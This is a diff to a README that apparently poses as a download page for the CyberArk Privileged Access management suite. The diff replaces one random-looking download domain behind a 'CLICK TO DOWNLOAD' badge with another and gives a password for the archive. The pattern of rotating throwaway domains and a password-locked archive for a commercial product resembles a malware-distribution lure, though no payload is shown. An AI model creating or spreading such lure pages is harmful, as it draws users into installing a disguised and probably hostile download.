@@ -1,6 +1,6 @@
 # CyberArk Privileged Access
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://bipfdjnk.com/Cyberark-Privileged-Access)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/Cyberark-Privileged-Access)
 > #### Archive password: `2026`
 
 Enterprise privileged access management suite that secures, rotates, and audits credentials for administrative and high-risk accounts.
